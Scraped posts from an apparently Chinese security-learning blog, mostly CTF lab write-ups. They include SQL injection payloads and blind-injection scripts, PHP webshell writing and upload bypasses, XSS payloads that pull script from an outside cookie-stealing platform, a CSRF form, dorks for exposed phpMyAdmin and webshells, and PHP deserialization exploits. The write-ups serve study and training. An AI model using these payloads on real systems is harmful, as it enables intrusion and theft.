1include_once("http://172.17.0.3/level3/flag.php") 可推测配置中allow_url_include=On，因此可以通过a=assert&amp;b=include(“http://xxxxx/shell.php“)的方式拿到shell，这也是我在检测脚本中加入include和require检测的原因，避免直接包含了加密文件和shell 总结：这次的题目较难，学到的东西也更多 1.学习了纯GET型的shell: 1&lt;?php $_GET[a]($_GET[b])?&gt; 2.在不支持union写入shell的情况下可以用 1terminated by 写入，并且，写入shell的函数除了into outfile,还有： 1into dumpfile 3.学习了利用端口转发远程登陆数据库 报错注入第一关：在注入之前先了解一下什么是UpdateXml注入： 12345678910111213141516171819UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值然后咱们再看看语句：http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)CONCAT(str1,str2,…) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。错误大概会是：ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ OK，既然了解了什么是UpdateXml注入，开搞： 简单测试，发下过滤了union及空格 查询库名： 1&apos; and 1=(updatexml(0x3a,concat(1,(select group_concat(schema_name) from information_schema.schemata)),1))# 查询表名： 1&apos; and 1=(updatexml(0x3a,concat(1,(select table_name from information_schema.tables where table_schema=’admin’)),1))# 查询列名： 1&apos; and 1=(updatexml(0x3a,concat(1,(select column_name from information_schema.columns where table_name=&apos;admin&apos; limit 0,1)),1))# 查询字段名： 1&apos; and 1=(updatexml(0x3a,concat(1,(select group_concat(username,password) from admin.admin)),1)) # 得到flag 第二关：猜测第二关要写入shell，试了下注入，果然没得到什么有用的东西，那就写入shell吧，尝试发现过滤了空格和union，空格用/**/绕过，union绕过可以用into outfile terminated by绕过： 11&apos;/**/into/**/outfile/**/&apos;/var/www/html/pass1.php&apos;/**/fields/**/terminated/**/by/**/0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e# 连接菜刀成功getshell，flag在后台 总结：学习了updatexml注入方式 基于时间的盲注：第一关：语句就不贴了，手注了下忘了记录，直接用sqlmap跑一下吧，跑出了管理员的MD5加密密码 根据刘师傅提示，有个upload.php，进去是一个上传界面，输入刚刚注入出来的密码，上传一个php文件显示换个姿势。 试了下00截断，改后缀都不行。用php5别名绕过了，并且给出了存储路径： 1文件/var/www/example.com/public_html/upload/20171027033920426.php5上传成功 连接菜刀成功getshell，并且flag里有彩蛋的一部分： 1彩蛋题tips1: 不是sleep盲注，mysql版本需要小于5.6.6，特殊位置 第二关：简单尝试发现空格和星号和%0a被过滤，本来准备用/**/绕过空格过滤看来是不行了，那就用%a0吧。 但是随之又出现了一个问题，构造： 1id=1&apos;%a0and%a0if(1=1,sleep(5),1)# 的时候，下面的回显是这样的： 1SELECT * FROM level2 WHERE id=&apos;1&apos;燼nd爄f(1=1,sleep(5),1)#&apos; LIMIT 0,1 被当成宽字节来出来了，可是我又发现其实sleep函数是被执行了的，也就是语句是正确的。 问了下大佬，是浏览器的锅，因为编码问题，但是内部是正确执行了的 既然是正确的，那就开始注入吧： 确定数据库长度： 1id=1&apos;%a0and%a0if(length(database())=6,sleep(5),1)# 为6 查询数据库名： 1id=1&apos;%a0and%a0if(left(database(),6)=&apos;group3&apos;,sleep(5),1)# 猜测和第一关的数据库名应该差不多，嘿嘿嘿偷个懒 查询表名： 1id=1&apos;%a0and%a0if(left((select%a0table_name%a0from%a0information_schema.tables%a0where%a0table_schema=database()),6)=&apos;level2&apos;,sleep(5),1)# 果然表名都差不多嘿嘿嘿 查询列名： 1id=1&apos;%a0and%a0if(left((select%a0column_name%a0from%a0information_schema.columns%a0where%a0table_name=&apos;level2&apos;%a0limit%a01,1),3)=&apos;KEY&apos;,sleep(5),1)# 这儿就需要加上limit参数，否则注入不出来，因为不止一个列，在这吃了亏 查询字段名： 这个手注就麻烦了，写脚本还不熟练，写个tamper吧（命名为test.py）： 1234567891011121314151617181920212223242526272829303132#-*- coding:utf-8 -*-from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): retVal = payload if payload: retVal = "" quote, doublequote, firstspace = False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace = True retVal += "%a0" continue elif payload[i] == '\'': quote = not quote elif payload[i] == '"': doublequote = not doublequote elif payload[i] == " " and not doublequote and not quote: retVal += "%a0" continue retVal += payload[i] return retVal 因为是post注入，所以需要抓取响应包，保存在sqlmap目录下，命名为1.txt 构造sqlmap语句： 1sqlmap -r &quot;1.txt&quot; -p id --tamper=test 但是发现KEY跑不出来，还是老老实实写个py脚本吧： 123456789101112131415161718192021# -*- coding:utf-8 -*-import requestsimport timeurl = 'http://222.18.158.233:9090/'pwd = ''for j in range(1,17): for g in range(48,123): payload = &#123;'id':'1\'and+if(ascii(substr((select`KEY`from`group3`.`level2`),%d,1))=%d,sleep(5),1) #' % (j,g)&#125; starttime = time.time() r = requests.post(url = url, data=payload) endtime = time.time() if endtime - starttime &gt; 4: pwd += chr(g) break else: g = g+1 j = j+1print("%s"%pwd) 拿到KEY，上传绕过和上一题是一样的 需要注意的是： sql注入时偶尔会遇到字段内容为空的情况。加个反引号就解决了 彩蛋题：有提示： 1师傅，分页的时候会出现注入吗？ 并且第一关也有tips： 1不是sleep盲注，mysql版本需要小于5.6.6，特殊位置 emmm版本需要小于5.6.6，特殊位置，并且传入的id值在limit参数那里，limit注入无疑 构造语句： 1id=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) 发现貌似不支持报错注入，那试试time_based： 1id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) = 5, BENCHMARK(5000000,SHA1(1)),1))))),1) 成功延时！但是我测试发现不能用sleep（废话，都说了不是sleep盲注了），只能用benchmark，既然知道了原理，那开搞吧 查询数据库： 1id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(database(),1,6) = &apos;group3&apos;, BENCHMARK(5000000,SHA1(1)),1))))),1) 查询表名： 1id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID((select table_name from information_schema.tables where table_schema=database()),1,6) = &apos;level3&apos;, BENCHMARK(5000000,SHA1(1)),1))))),1) 查询列名： 1id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID((select column_name from information_schema.columns where table_name=&apos;level3&apos; limit 1,1),1,4) = &apos;flag&apos;, BENCHMARK(5000000,SHA1(1)),1))))),1) 发现不行，等会去问问师傅 查询flag字段，还是上脚本吧，用原来的脚本改一下就好，改下url，将payload改为： 1payload = &#123;&apos;id&apos;:&apos;1 procedure analyse((select extractvalue(rand(),concat(0x3a,(if(ascii(mid((select flag from group3.level3),%d,1)) = %d, benchmark(5000000,SHA1(1)),1))))),1)&apos; % (j,g)&#125; 得到flag：2712a55324be9a15 给了提示： 12345678if(preg_match(./.+\.ph(p[3457]?|t|tml)$/',$filename))&#123; die("hack me?my big brother is localguy");&#125;else&#123; $f = fopen($filepath, 'w'); fwrite($f, $content); fclose($f); echo "upload success:upload/$filename";&#125; 看来是需要绕过这个正则了，并且上传的内容长度限制在22个字符，这个好办，用如下php木马就行： 1&lt;?=eval($_POST[0]);?&gt; 但是刘师傅在群里说过没开短标签，所以这个不行 正则匹配的有： 1php,php3,php4,php5,php7,pht,phtml 推测是apache解析漏洞利用 php6，.php.xxx，00截断的后缀不行，上传后访问只能在源码看来php代码，被当作文本文件执行了，试了很多都不行，难道不是apache解析漏洞？赶紧找大佬py一波，果然不是apache解析漏洞，是文件路径解析漏洞 文件上传：第一关：随便上传一张图片，发现会回显出上传路径。如果是上传一个非图片文件，会显示Invalid file。 直接将php文件的后缀改为.jpg试试，发现不可以。那就只能在一张正常图片里加入木马了： 1copy 1.jpg/b+1.php/a 2.jpg 上传后连接菜刀不成功 经过多次测试，发现应该是检测了文件头，在一句话木马前加入图片文件头就OK了： 1GIF89a&lt;?php phpinfo(); ?&gt; 附上几种文件头： 1234（1） .JPEG;.JPE;.JPG，”JPGGraphic File”（2） .gif，”GIF 89A”（3） .zip，”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 另外Content-Type: 也需要改成图片格式，例如： 1Content-Type: image/gif 最后上传的时候抓包，在php一句话木马后面加上.jpg 发包，连接菜刀，成功getshell 第二关：尝试了下，检测了文件头以及Content-Type 本来是想上传一个.htaccess文件进行重写解析规则绕过： 1234&lt;FilesMatch &quot;67.gif&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后上传一个67.gif会被当作php文件解析 但是发现会被重命名，所以这条路行不通 同理上传.user.ini 1auto_prepend_file=1.gif 也行不通 能直接上传php或者php的其他别名文件，但是访问发现会被解析成txt文件输出 上传Php的话会被解析成图片，尝试了多次发现应该是非php、txt文件都会被解析成图片，而php、txt文件会被解析成txt文件 但是注意到一个细节，当上传php一句话木马的时候，访问得到的文本为： 1_ @eval($_POST['67'];) ?&gt; 前面的&lt;?php没了，有这个过滤？那试试短标签，端标签没有这个： 12GIF89a&lt;?=eval($_POST[0]);?&gt; 成功getshell 果然在源码里看到了这句： 1$content = preg_replace('/&lt;\?php|;\?&gt;|&lt;script|&lt;\/script&gt;/i', '_', $content); XSS：第一关：进入题目以为就是直接xss弹窗，但是试了很多次，发现都不能弹，看来是要盗取管理员cookie了 利用网上免费的xss平台，直接盗取cookie登陆 进去之后还有一个坑，必须要把所有的链接都点一遍并且点back才能得到一个效果很炫酷的flag 第二关：提示： 1234567$array = ["*", "%", "0x", "&amp;", "|", ".", "'"];foreach($array as $str)&#123; $content = str_replace($str, replace:"",$content);&#125;$pattern2 = '/limit|or|and|union|select|hex|substr|group|where|by/i';$pattern3 = '/(style|title|script|href|img|href)/i';$pattern3 = '/(expression|on)/i'; 过滤了很多标签以及关键字，如果插入的内容里含有这些关键字，就会弹窗提示换个标签 试下data协议： 12&lt;iframe src="data:text/html;base64,aHR0cDovL3hzc3B0LmNvbS9TUGxpTWo/MTUxMDY1ODM1Ng=="&gt;&lt;/iframe&gt; 因为这句话： 1data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4= 和以下是等价的： 1javascript:alert("xss") 或者 &lt;script&gt;alert("xss")&lt;/script&gt; 但是没拿到cookie，试试ojbk标签，呸是object标签 1&lt;object data="data:text/html;base64,aHR0cDovL3hzc3B0LmNvbS9TUGxpTWo/MTUxMDY2MDg5Ng=="&gt;&lt;/object&gt; 还是没cookie 确实没思路了，py了一波出题人，他构造的语句是： 1&lt;iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUmxmTmVsRT48L3NjcmlwdD4="&gt;test&lt;/a&gt;&lt;/iframe&gt; 很迷，不清楚为啥中间要加a标签才能成功，出题人是说闭合a标签，可是吃瓜群众从右键源码里根本看不出有个a标签啊 测试发现用的那个免费xss平台项目里的四个url，不是每个都能用，但是第一关就是每个都能用，留着以后问问吧 CSRF：好吧终于到我们组的题目了 第一关：进入题目没有什么线索，查看源码发现一些奇怪的代码： 1234567891011&lt;!-- Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook. Ook!Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook! Ook. Ook! Ook. Ook? Ook. --&gt; 是ook加密，解密得到一个ip地址，丢到referer里面就得到flag了 第二关：进去是一个登陆界面，猜测是利用csrf攻击添加用户然后登陆得到flag，每次出题思路也是这样的 GET型： 1?username=test&amp;&amp;password=test POST型： 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 align="center"&gt;404&lt;/br&gt;The page not found&lt;/h1&gt; &lt;form action="http://45.32.90.22:4000/Challenge_2.php"; id="test" method="POST"&gt; &lt;input type="hidden" name="username"&gt;&lt;br&gt; &lt;input type="hidden" name="password"&gt; &lt;/form&gt;&lt;/body&gt;&lt;script&gt; var f=document.getElementById("test"); f.getElementsByTagName("input")[0].value="test"; f.getElementsByTagName("input")[1].value="pass"; f.submit();&lt;/script&gt;&lt;/html&gt; 然后管理员访问就能插入用户了，登陆拿到flag 第三关：进去是特斯拉的商城界面，点击购买，会有弹窗提示无法购买 查看源码能得到信息： 12&lt;!--关键参数可猜解--&gt;&lt;!--ip.txt--&gt; 访问ip.txt发现是一系列的ip，猜测需要爆破 这里有一个坑，肯定很多人会去爆破x-forward-for参数，但其实是爆破token参数，并且爆破的时候要用md5加密 爆破成功后访问就能拿到flag]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google hacking&Shodan]]></title>
    <url>%2F2017%2F11%2F07%2FGoogle-hacking%26Shodan%2F</url>
    <content type="text"><![CDATA[寻找漏洞肯定是要学习Google Hacking语法和Shodan搜索引擎嘛，天也不早了，开搞 Google Hacking1.google不区分大小写的 2.google可以使用通配符，*表示一个词/字 3.intitle/allintitle 关键字：表示在页面标题里查找关键字 12查找可以未经授权就可以访问的phpMyAdmin的后台页面inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin 4.filetype 类型：查找指定文件类型，和ext一样 5.site：将搜索范围缩小到指定站点 1site:http://eagerseven.cn 6.inurl/allinurl：在url中寻找关键字 12可以结合sqlmap进行自动搜索一些有sql注入的站点：sqlmap.py -u -g inurl:php?id=1还可以用来搜索别人留下的webshell：inurl:diy.asp 有一类木马的默认名就叫diy.asp 7.intext/allintext：在网页内容中查找关键字 1两者可以结合用来进行指定端口开启网站的扫描：inurl:8080 -intext:8080 8.link：搜索链接到某个网站的链接 9.基本操作方法是 操作符:关键字，注意，这三者之间不能有空格，如果需要空格要用引号括起来 10.Google 网页快照是Google 在抓取网站时会为每个网页拍摄快照作的备份。这些网页快照成为Google“缓存”的一部分。当你发现你要访问的网页已经不错存在的时候，可以通过Google网页快照来查看这个备份。 1http://cachedview.com/index.php?lang=zh 11.服务器信息收集：例如：intitle:index.of filetype:log通过这个还能找到一些搜不到的目录，比如通过搜索进入了某个文件目录，由于服务器设置不当，通过 “上一级” “Parent Directory” 可以跳到别的目录。此外还可以在指定站点搜索一些常见的错误信息，比如 intitle:error intitle:warning 常用关键字： 12345678intitle:index.oferror|warninglogin|logonusername|userid|IDpassword|passcodeadmin|administrator-ext:html|-ext:htm|-ext:asp|-exp:php 过滤掉常见的inurl:temp|inurl:tmp|inurl:backup|inurl:bak 这个不一定用url来 12.加号“+”用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加“-”减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选 13.高级操作符中以all开头的操作符在一般情况下一个查询中只能用一次， 不能和其他操作符混用 14.related：后面接一个url，搜索与该url相关的页面，不能混用 15.numrange：x-y：表示搜索x到y范围内的内容 16：daterange：搜索某个日期范围内的内容 google hacking语法远远不止这些，先学习一些常用的，寒假回家好好看看那本关于google hacking的书 Shodanhostname：搜索指定的主机或域名，例如 hostname:”google” port：搜索指定的端口或服务，例如 port:”21” country：搜索指定的国家，例如 country:”CN” city：搜索指定的城市，例如 city:”Hefei” org：搜索指定的组织或公司，例如 org:”google” isp：搜索指定的ISP供应商，例如 isp:”China Telecom” product：搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version：搜索指定的软件版本，例如 version:”1.6.2” geo：搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808” before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15” net：搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” 实例： 查找位于成都的apache服务器： 1apache city:&quot;Chengdu&quot; 查找位于国内的Nginx服务器： 1nginx country:&quot;CN&quot; 查找GWS（Google Web Server）服务器： 1&quot;Server:gws&quot; hostname:&quot;google&quot; 查找指定网段的华为设备： 1huawei net:&quot;127.0.0.0/24&quot; 路还很长]]></content>
      <tags>
        <tag>信息收集</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞在CTF中的应用]]></title>
    <url>%2F2017%2F11%2F02%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[例子1：是道格暑期CTF平台里的一道反序列化题，源码为： 1234567891011121314151617181920212223242526272829303132333435try to get flag13579.php class just4fun &#123; public $filename; function __toString() &#123; return @file_get_contents($this-&gt;filename); &#125; &#125; $data = stripslashes($_GET[&apos;data&apos;]); if (!$data) &#123; die(&quot;hello from y&quot;); &#125; $token = $data[0]; $pass = true; switch ( $token ) &#123; case &apos;a&apos; : case &apos;O&apos; : case &apos;b&apos; : case &apos;i&apos; : case &apos;d&apos; : $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data ); break; default: $pass = false; &#125; if (!$pass) &#123; die(&quot;cry again!&quot;); &#125; echo unserialize($data); 根据源码构造的poc如下： 1234567891011&lt;?phpclass just4fun &#123; public $filename; function __toString() &#123; return @file_get_contents($this-&gt;filename); &#125;&#125;$i = new just4fun();$i-&gt;filename = ‘13579flag.php’;var_dump(serialize($i));?&gt; 输出值为： 1string(55) “O:8:”just4fun”:1:&#123;s:8:”filename”;s:13:”13579flag.php”;&#125;” 将这个值复制给data参数，但是发现不行，注意这个正则： 1preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data ) 反序列化时会忽略掉用来表示长度的数字前面的加号，大概是把加号当作正号来处理了吧，但是还是不行，把加号url编码就OK了 例子2：还是道格暑期CTF平台里面的题，源码： 1234567891011121314151617181920212223class just4fun &#123; var $enter; var $secret;&#125; if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &apos;?????????????&apos;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;&#125; 简单分析一下，只要满足\$o-&gt;secret === \$o-&gt;enter就能输出flag 题目里提示了取地址符，那就构造poc： 123456789&lt;?phpclass just4fun &#123;var $enter;var $secret;&#125;$i = new just4fun();$i-&gt;enter = &amp;$i-&gt;secret;var_dump(serialize($i));?&gt; 就先找到这两个例子，另外几个例子目前理解起来还有困难，在接下来的学习中再好好体会一下]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP序列化和反序列化基本概念与简单利用]]></title>
    <url>%2F2017%2F11%2F02%2FPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[一直说想好好学一下的PHP序列化和反序列化一直拖一直拖拖到现在，身边各种小事杂事告一段落，所以开始整序列化和反序列化吧 什么是序列化和反序列化？php允许保存一个对象方便以后重用，这个过程称为序列化，反过来自然就是反序列化了。直接通过两个简单粗暴的例子来看看什么是序列化和反序列化 1234567891011121314151617181920&lt;?phpclass User&#123; public $age = 0; public $name = &apos;&apos;; public function PrintData() &#123; echo $this-&gt;name . &apos;is&apos; . %this-&gt;age . &apos;years old&lt;br /&gt;&apos;; &#125;&#125;$user = new User();$user-&gt;age = 20;$user-&gt;name = &apos;Tom&apos;;$user-&gt;PrintData();echo serialize($user);?&gt; 输出结果为： 12Tom is 20 years oldO:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;&#125; 解读一下那串序列化字符串： 123456O代表是一个对象4代表是对象名User的长度User代表对象名2代表有两个属性或者方法s代表stringi代表int 再来看看反序列化的例子： 123456789101112131415&lt;?phpclass User&#123; public $age = 0; public $name = &apos;&apos;; public function PrintData() &#123; echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos;years old&lt;br /&gt;&apos;; &#125;&#125;$user = unserialize(&apos;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;&#125;&apos;);$user-&gt;PrintData();?&gt; 输出结果为： 1User Tom is 20years old 序列化是如何工作的？magic函数__construct和__destruct会在对象创建或者销毁时自动调用，__sleep magic方法在一个对象被序列化的时候调用，__wakeup magic方法在一个对象被反序列化的时候调用。通过一个例子来说明： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass Test&#123; public $variable = &apos;BUZZ&apos;; public $variable2 = &apos;PTHER&apos;; public function PrintVariable() &#123; echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;; &#125; public function __construct() &#123; echo &apos;__construct&lt;br /&gt;&apos;; &#125; public function __destruct() &#123; echo &apos;__destruct&lt;br /&gt;&apos;; &#125; public function __wakeup() &#123; echo &apos;__wakeup&lt;br /&gt;&apos;; &#125; public function __sleep() &#123; echo &apos;__sleep&lt;br /&gt;&apos;; return array(&apos;variable&apos;, &apos;variable2&apos;); &#125;&#125;//创建对象调用__construct$obj = new Test();//序列化对象调用__sleep$serialized = serialize($obj);//输出序列化后的字符串print &apos;Serialized: &apos; . $serialized . &apos;&lt;br /&gt;&apos;;//重建对象调用__wakeup$obj2 = unserialize($serialized);//调用PrintVariable输出数据$obj2-&gt;PrintVariable();//结束脚本调用__destruct?&gt; 输出结果为： 1234567__construct__sleepSerialized: O:4:&quot;Test&quot;:2:&#123;s:8:&quot;variable&quot;;s:4:&quot;BUZZ&quot;;s:9:&quot;variable2&quot;;s:5:&quot;PTHER&quot;;&#125;__wakeupBUZZ__destruct__destruct 如何利用序列化进行攻击？例子1：有多种可能的方法，取决于应用程序、可用的类和magic函数。序列化对象包含攻击者控制的对象值。可能在web应用程序源代码中找到一个定义__wakeup或__destruct的类，这些函数会影响web应用程序。例如我们可能会找到一个临时将日志存储到文件中的类，当销毁时对象可能不再需要日志文件并将其删除，具体看下面的例子： 1234567891011121314151617&lt;?phpclass LogFile&#123; public $filename = &apos;error.log&apos;; public function LogData($text) &#123; echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;; file_put_contents($-&gt;filename, $text, FILE_APPEND); &#125; public function __destruct() &#123; echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;; unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename); &#125;&#125;?&gt; 这段代码保存为logfile.php 构建test.php： 1234567891011121314&lt;?phpinclude &apos;logfile.php&apos;;class User&#123; public $age = 0; public $name = &apos;&apos;; public function PrintData() &#123; echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos;years old&lt;br /&gt;&apos;; &#125;&#125;$user = unserialize($_GET[&apos;usr_serialized&apos;]);?&gt; 最后构造攻击代码111.php： 123456&lt;?phpinclude &apos;logfile.php&apos;;$obj = new LogFile();$obj-&gt;filename = &apos;1.php&apos;;echo serialize($obj) . &apos;&lt;br /&gt;&apos;;?&gt; 将111.php的输出 内容： 1O:7:&quot;LogFile&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;&#125; 构造到usrserialized参数里，会发现调用了\_destruct类删除了1.php： 1__destruct deletes &quot;1.php&quot; file. 查看目录，成功删除了1.php，就成功的利用了一次php反序列化漏洞 例子2：某用户类定于了一个__toString为了让应用程序能够将类作为一个字符串输出（echo $obj），而且其他类也可能定义了一个类允许__toString读取某个文件 将下列代码保存为test.php 123456789101112131415161718192021222324252627&lt;?phpclass FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;class User&#123; public $age = 0; public $name = &apos;&apos;; public function __toString() &#123; return &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old&lt;br /&gt;&apos;; &#125;&#125;//用户控制的内容$obj = unserialize($_GET[&apos;usr_serialized&apos;]);echo $obj;?&gt; 访问： 1http://127.0.0.1/srialized/test.php?usr_serialized=O:4:%22User%22:2:&#123;s:3:%22age%22;i:20;s:4:%22name%22;s:4:%22John%22;&#125; 输出结果为： 1User John is 20 years old 但是如果我们用序列化调用FileClass呢 先建立一个1.txt： 1password = 123456 再建立一个利用代码1.php： 123456&lt;?phpinclude &apos;test.php&apos;;$fileobj = new FileClass();$fileobj-&gt;filename = &apos;1.txt&apos;;echo serialize($fileobj);?&gt; 访问之，输出结果为： 1O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125; 将这个值赋值给usr_serialized参数： 1http://127.0.0.1/srialized/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125; 输出结果为： 1password = 123456 实现了用序列化调用FileClass 也可以使用其他magic函数：如果对象将调用一个不存在的函数call将被调用；如果对象试图访问不存在的类变量get和set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。 总结：终于搬完了，学习了序列化和反序列化的基本概念以及简单应用（虽然是搬的别人的，本来是想自己看一下他人的成功然后自己总结写一下，但是大佬写的太好了，就稍作改动搬过来了，读书人的事又不叫偷#(滑稽)），下一步将以前做过的反序列化漏洞相关的ctf题再好好看一下，另起一篇文章记录一下吧]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[光棍节程序员闯关秀]]></title>
    <url>%2F2017%2F11%2F01%2F%E5%85%89%E6%A3%8D%E8%8A%82%E7%A8%8B%E5%BA%8F%E5%91%98%E9%97%AF%E5%85%B3%E7%A7%80%2F</url>
    <content type="text"><![CDATA[群里有大佬分享了一个类似CTF的靶场，名字就特吸引人，光棍节程序员闯关秀，提早给自己过个节吧 第一关：tips：从所有信息中找到进入下一关的方法 水题，右键源码里有连接进入下一关 第二关：tips：密码在哪呢？ 右键能看到密码，直接输入就可以进入下一关 第三关：开始没反应过来，进行了很多尝试，包括sql注入这些 后来进行抓包后go，在响应包里看到了： 1The-Key-Is: a87ff679a2f3e71d9181a67b7542122c 将k参数的值变成这个，OK成功 第四关：观察你密码的规律 将k的值md5解密一下，发现解密后是4，说找规律，那将5的MD5值替换上去是不是就是下一关了 试了下果然是这样 第五关：进去后是一个二维码 扫描之后发现被耍了，是一个404，虽然是一个制作的404，但是看了下没有什么有用的东西 那会不会是图片隐写，下载后果然图片里藏着KEY 第六关：进入题目是一串密文，直接替换给K参数肯定不对 md5解码能解到，是一条付费解密，emmm才不是因为我没钱 想了很久，直接扔百度竟然有人解密过了，又省了钱 看来以后的md5都要先扔百度再去解密了 第七关：tips：有问题就Google是个好习惯! 再试试 但是扔谷歌没用啊，又被耍了 玛德后来才发现把这串密文放到k参数那里就能过关 第八关：tips：有时候事情就是这么简单，钥匙就在手里, 门却不知所踪 直接访问的话抓包发现框里的值会直接赋值给k参数，按照提示，推测是将钥匙post提交，直接提交肯定不行，k参数试试，成功 第九关：哇二进制？这就触及我的知识盲区了 看看wp，原来不是二进制啊，将缺失的部分全部补为1就对了，毕竟双十一嘛 本来是想通过手工补全的，算了还是写个脚本吧 补全的php脚本： 123456789&lt;?php$bin = &lt;&lt;&lt;binary密文binary;$bin = str_replace(&apos;_&apos;,&apos;1&apos;,$bin);echo $bin;?&gt; 解密脚本： 12345678910# -*- coding:utf-8 -*-import base64bin = &apos;&apos;&apos;密文&apos;&apos;&apos;binTochar = [chr(int(x, 2)) for x in bin.strip().split()]print 